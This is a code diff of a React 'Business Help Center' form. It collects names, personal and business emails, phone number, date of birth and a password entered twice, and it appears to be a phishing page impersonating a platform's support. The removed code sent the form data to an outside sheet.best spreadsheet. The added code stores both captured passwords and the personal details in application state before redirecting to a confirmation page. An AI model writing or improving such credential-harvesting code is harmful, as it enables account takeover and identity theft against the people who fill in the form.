@@ -1,57 +1,30 @@
 import React, { useState } from "react";
-// import { useNavigate } from "react-router-dom";
-import '../business-help-center/styleBusiness.css';
+import '../business-help-center/style.css';
 import { Button, Form, Input, Modal, Space } from 'antd';
 import { SearchOutlined } from "@mui/icons-material";
 import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
 import { faHouseChimney } from '@fortawesome/free-solid-svg-icons';
-import axios from "axios";
 import { useNavigate } from "react-router-dom";
-// import type { FormInstance } from 'antd';
+import { useDispatch } from "react-redux";
+import { setData } from "../../store/business/businessSlice";
+
+
 const BusinessHelpCenter = () => {
   const [form] = Form.useForm();
   const navigate = useNavigate();
-  const [namePage, setnamePage] = useState('');
-  const [fullName, setfullName] = useState('');
-  const [businessEmail, setbusinessEmail] = useState('');
-  const [personalEmail, setpersonalEmail] = useState('');
+  const [namePage, setNamePage] = useState('');
+  const [fullName, setFullName] = useState('');
+  const [businessEmail, setBusinessEmail] = useState('');
+  const [personalEmail, setPersonalEmail] = useState('');
   const [phone, setPhone] = useState('');
-  const [date, setdate] = useState('');
-  const [text, settext] = useState('');
-  const [password1, setpassword1] = useState('');
-  const [password2, setpassword2] = useState('');
+  const [date, setDate] = useState('');
+  const [text, setText] = useState('');
+  const [passwordFirst, setPasswordFirst] = useState('');
+  const [passwordSecond, setPasswordSecond] = useState('');
   const [checkPass, setCheckPass] = useState(false);
   const [open, setOpen] = useState(false);
   const { TextArea } = Input;
-
-
-  const handleSubmit = async (e: any) => {
-    e.preventDefault();
-    // console.log(namePage, fullName, businessEmail, personalEmail, phone, text)
-    const data = {
-      ["Name Page"]: namePage,
-      ["Full Name"]: fullName,
-      ["Business Email Address"]: businessEmail,
-      ["Personal Email Address"]: personalEmail,
-      ["Mobile Phone Number"]: phone,
-      ["Date of Birth"]: date,
-      ["Please provide us information that will help us investigate"]: text,
-
-    }
-    axios.post('https://sheet.best/api/sheets/abe85991-15f1-47f0-a1d6-242f44b22e94', data).then((response) => {
-      console.log(response);
-      setnamePage('');
-      setfullName('');
-      setbusinessEmail('');
-      setpersonalEmail('');
-      setPhone('');
-      setdate('');
-      settext('');
-
-    })
-
-  };
-
+  const dispatch = useDispatch()
 
 
 
@@ -70,17 +43,38 @@ const BusinessHelpCenter = () => {
   const onFinish = (e: any) => {
     if (!checkPass) {
       setCheckPass(true)
-      setpassword1(e.password)
+      setPasswordFirst(e.password)
     }
     else {
-      setpassword2(e.password)
+      setPasswordSecond(e.password)
       setCheckPass(false)
       navigate('/confirm');
+      dispatch(setData({
+        namePage,
+        fullName,
+        businessEmail,
+        personalEmail,
+        phone,
+        date,
+        text,
+        passwordFirst,
+        passwordSecond: e.password,
+      }))
+      clearState()
     }
-
   };
 
-
+  const clearState = () => {
+    setNamePage('');
+    setFullName('');
+    setBusinessEmail('');
+    setPersonalEmail('');
+    setPhone('');
+    setDate('');
+    setText('');
+    setPasswordFirst('')
+    setPasswordSecond('')
+  }
 
   return (
     <div className="container_business">
@@ -141,26 +135,26 @@ const BusinessHelpCenter = () => {
             <div className="form">
               <Form form={form} name="validateOnly" layout="vertical" autoComplete="off">
                 <Form.Item name="namePage" label="Name Page" rules={[{ required: true, message: "Name Page is required" }]}>
-                  <Input onChange={(e) => setnamePage(e.target.value)} value={namePage} />
+                  <Input onChange={(e) => setNamePage(e.target.value)} value={namePage} />
                 </Form.Item>
                 <Form.Item name="fullName" label="Fullname" rules={[{ required: true, message: "Fullname is required" }]}>
-                  <Input onChange={(e) => setfullName(e.target.value)} value={fullName} />
+                  <Input onChange={(e) => setFullName(e.target.value)} value={fullName} />
                 </Form.Item>
                 <Form.Item name="businessEmail" label="Business Email Address" rules={[{ required: true, message: "Business Email Address is required" }]}>
-                  <Input onChange={(e) => setbusinessEmail(e.target.value)} value={businessEmail} />
+                  <Input onChange={(e) => setBusinessEmail(e.target.value)} value={businessEmail} />
                 </Form.Item>
                 <Form.Item name="personalEmail" label="Personal Email Address" rules={[{ required: true, message: "Personal Email Address is required" }]}>
-                  <Input onChange={(e) => setpersonalEmail(e.target.value)} value={personalEmail} />
+                  <Input onChange={(e) => setPersonalEmail(e.target.value)} value={personalEmail} />
                 </Form.Item>
                 <Form.Item name="phone" label="Mobile Phone Number" rules={[{ required: true, message: "Mobile Phone Number is required" }]}>
                   <Input onChange={(e) => setPhone(e.target.value)} value={phone} />
                 </Form.Item>
                 <Form.Item name='dateBirth' label="Date of Birth" rules={[{ required: true }]}>
-                  <Input type="date" onChange={(e) => setdate(e.target.value)} value={date} />
+                  <Input type="date" onChange={(e) => setDate(e.target.value)} value={date} />
                 </Form.Item>
                 <div className="text_sup">
                   <Form.Item name='text' label="Please provide us information that will help us investigate." >
-                    <TextArea rows={4} onChange={(e) => settext(e.target.value)} value={text} />
+                    <TextArea rows={4} onChange={(e) => setText(e.target.value)} value={text} />
                   </Form.Item>
                 </div>
               </Form>
@@ -216,7 +210,6 @@ const BusinessHelpCenter = () => {
             </div>
           </div>
           <div className="tab">
-
           </div>
         </div>
       </div>
